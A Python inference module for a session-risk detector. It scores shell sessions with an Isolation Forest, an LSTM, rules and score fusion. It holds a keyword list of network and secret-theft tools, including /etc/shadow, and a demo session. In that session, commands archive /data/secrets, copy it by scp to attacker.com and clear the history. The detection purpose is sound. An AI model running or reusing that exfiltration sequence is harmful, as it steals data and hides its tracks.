"""
Inference pipeline — scores sessions through IF, LSTM, rules, fusion, and optional GenAI explanation.

Usage:
  result = score_session(session_data)
  df     = score_dataframe(df)
"""

import os
import sys
import json
import numpy as np
import pandas as pd
import joblib
import torch
from pathlib import Path
from dataclasses import asdict
from typing import Dict, Optional
from dotenv import load_dotenv
load_dotenv()

SRC_DIR = Path(__file__).resolve().parent.parent
if str(SRC_DIR) not in sys.path:
    sys.path.insert(0, str(SRC_DIR))

from rule_engine import evaluate_session
from risk_fusion import fuse_scores, FusedRisk
from genai.explainer import explain_risk, build_risk_context, RiskExplanation
from genai.report import generate_report, ThreatReport
from genai.copilot import create_session, ask

PROJECT_ROOT    = SRC_DIR.parent
IF_MODEL_PATH   = PROJECT_ROOT / "models" / "isolation_forest.joblib"
IF_SCALER_PATH  = PROJECT_ROOT / "models" / "robust_scaler.joblib"
LSTM_MODEL_PATH = PROJECT_ROOT / "models" / "lstm_risk_model.pt"

_model_cache = {}


def load_models(force_reload: bool = False):
    """Load all models into cache once."""
    if force_reload or not _model_cache:
        if IF_MODEL_PATH.exists():
            artifacts = joblib.load(IF_MODEL_PATH)
            _model_cache["if_model"]    = artifacts["model"]
            _model_cache["if_scaler"]   = artifacts["scaler"]
            _model_cache["if_features"] = artifacts["features"]
        else:
            print("[WARN] Isolation Forest model not found")

        if LSTM_MODEL_PATH.exists():
            ckpt = torch.load(LSTM_MODEL_PATH, map_location="cpu", weights_only=False)
            _model_cache["lstm_ckpt"] = ckpt

            from train_sequence import LSTMRiskModel
            lstm = LSTMRiskModel(
                vocab_size  = len(ckpt["vocab"]),
                embed_dim   = ckpt["embed_dim"],
                hidden_dim  = ckpt["hidden_dim"],
                num_meta    = ckpt["num_meta"],
                num_classes = ckpt["num_classes"],
            )
            lstm.load_state_dict(ckpt["model_state"])
            lstm.eval()
            _model_cache["lstm_instance"] = lstm
        else:
            print("[WARN] LSTM model not found")
    return _model_cache


def score_anomaly(session: dict) -> float:
    """Isolation Forest anomaly score (0-1)."""
    load_models()
    if_model  = _model_cache.get("if_model")
    if_scaler = _model_cache.get("if_scaler")
    feature_cols = _model_cache.get("if_features", [])

    if if_model is None:
        return 0.0

    features = np.array([[float(session.get(c, 0)) for c in feature_cols]])
    features = if_scaler.transform(features)

    raw = if_model.decision_function(features)[0]
    return round(max(0.0, min(1.0, 0.5 - raw)), 4)


def score_sequence(session: dict) -> float:
    """LSTM sequence risk score (0-1)."""
    load_models()
    ckpt = _model_cache.get("lstm_ckpt")
    lstm = _model_cache.get("lstm_instance")
    if ckpt is None or lstm is None:
        return 0.0

    vocab   = ckpt["vocab"]
    max_len = ckpt["max_len"]
    cmd_seq = session.get("command_sequence", "")
    cmds    = cmd_seq.split(" -> ")[-max_len:]
    ids     = [vocab.get(c, 1) for c in cmds]
    ids     = [0] * (max_len - len(ids)) + ids
    x_seq   = torch.tensor([ids], dtype=torch.long)

    meta = _extract_meta(session, cmds, cmd_seq)
    x_meta = torch.tensor(
        (meta - ckpt["scaler_mean"]) / (ckpt["scaler_scale"] + 1e-8),
        dtype=torch.float
    )

    with torch.no_grad():
        logits = lstm(x_seq, x_meta)
        probs  = torch.softmax(logits, dim=1).numpy()[0]

    return float(probs[2])


def _extract_meta(session, cmds, cmd_seq):
    return np.array([[
        float(session.get("after_hours", 0)),
        float(session.get("command_count", len(cmds))),
        len(set(cmds)) / max(len(cmds), 1),
        cmd_seq.lower().count("sudo"),
        sum(cmd_seq.lower().count(kw) for kw in
            ["base64","wget","curl","scp","nmap","sshpass",
             "chmod 777","crontab","/etc/shadow","attacker"]),
        float(session.get("session_duration_s", 0)),
    ]], dtype=np.float32)


def score_rules(session: dict) -> tuple:
    result = evaluate_session(session)
    return result.rule_score, result.rule_names


def score_session(session: dict, explain: bool = True) -> dict:
    """Full pipeline for a single session."""
    load_models()
    anomaly_score = score_anomaly(session)
    sequence_score = score_sequence(session)
    rule_score, triggered_rules = score_rules(session)

    fused = fuse_scores(anomaly_score, sequence_score, rule_score, triggered_rules)

    output = {
        "anomaly_score":   anomaly_score,
        "sequence_score":  sequence_score,
        "rule_score":      rule_score,
        "final_risk":      fused.final_risk,
        "risk_level":      fused.risk_level,
        "confidence":      fused.confidence,
        "triggered_rules": triggered_rules,
    }

    if explain:
        output["explanation"] = asdict(explain_risk(fused, session))

    return output


def score_dataframe(df: pd.DataFrame, top_n_explain: int = 5) -> pd.DataFrame:
    """Batch pipeline — vectorized IF + batched LSTM + optional Gemini for top-N."""
    load_models()
    df = df.copy()

    # Vectorized Isolation Forest
    if_model  = _model_cache.get("if_model")
    if_scaler = _model_cache.get("if_scaler")
    feat_cols = _model_cache.get("if_features", [])

    if if_model is not None:
        available = [c for c in feat_cols if c in df.columns]
        X = df[available].fillna(0).values.astype(float)
        if len(available) < len(feat_cols):
            pad = np.zeros((len(df), len(feat_cols) - len(available)))
            X = np.hstack([X, pad])
        X_scaled = if_scaler.transform(X)
        raw = if_model.decision_function(X_scaled)
        df["anomaly_score"] = np.clip(0.5 - raw, 0.0, 1.0).round(4)
    else:
        df["anomaly_score"] = 0.0

    # Batched LSTM
    ckpt = _model_cache.get("lstm_ckpt")
    lstm = _model_cache.get("lstm_instance")

    if ckpt is not None and lstm is not None:
        vocab   = ckpt["vocab"]
        max_len = ckpt["max_len"]
        all_seq_ids = []
        all_meta    = []

        for _, row in df.iterrows():
            cmd_seq = str(row.get("command_sequence", ""))
            cmds = cmd_seq.split(" -> ")[-max_len:]
            ids  = [vocab.get(c, 1) for c in cmds]
            ids  = [0] * (max_len - len(ids)) + ids
            all_seq_ids.append(ids)
            all_meta.append(_extract_meta(row.to_dict(), cmds, cmd_seq)[0])

        x_seq  = torch.tensor(all_seq_ids, dtype=torch.long)
        meta   = np.array(all_meta, dtype=np.float32)
        x_meta = torch.tensor(
            (meta - ckpt["scaler_mean"]) / (ckpt["scaler_scale"] + 1e-8),
            dtype=torch.float
        )

        with torch.no_grad():
            logits = lstm(x_seq, x_meta)
            probs  = torch.softmax(logits, dim=1).numpy()

        df["sequence_score"] = probs[:, 2].round(4)
    else:
        df["sequence_score"] = 0.0

    # Rule engine
    rules_out = df.apply(lambda r: score_rules(r.to_dict()), axis=1)
    df["rule_score"]      = rules_out.apply(lambda x: x[0])
    df["triggered_rules"] = rules_out.apply(lambda x: x[1])

    # Fuse
    df["final_risk"] = df.apply(
        lambda r: fuse_scores(r["anomaly_score"], r["sequence_score"], r["rule_score"]).final_risk, axis=1
    ).round(4)
    df["risk_level"] = df["final_risk"].apply(
        lambda x: "critical" if x >= 0.8 else "high" if x >= 0.55 else "medium" if x >= 0.3 else "low"
    )

    # Gemini explanations for top-N only
    df["explanation"] = ""
    if top_n_explain > 0:
        top_idx = df.nlargest(top_n_explain, "final_risk").index
        for idx in top_idx:
            row = df.loc[idx]
            fused = fuse_scores(row["anomaly_score"], row["sequence_score"], row["rule_score"])
            df.at[idx, "explanation"] = str(asdict(explain_risk(fused, row.to_dict())))

    return df


if __name__ == "__main__":
    sample_session = {
        "session_id": "demo-001",
        "user_id": "AJF0370",
        "date": "2010-06-15",
        "after_hours": 1,
        "login_count": 12,
        "unique_devices_used": 4,
        "total_bytes_transferred": 2_500_000_000,
        "command_sequence": (
            "sudo su -> find / -name *.db -> "
            "tar czf /tmp/dump.tar.gz /data/secrets -> "
            "scp /tmp/dump.tar.gz attacker.com:/loot/ -> "
            "history -c"
        ),
        "command_count": 5,
        "session_duration_s": 3600,
    }

    print("=" * 60)
    print("  Inference Pipeline Demo")
    print("=" * 60)

    result = score_session(sample_session, explain=True)
    print(json.dumps(result, indent=2, default=str))
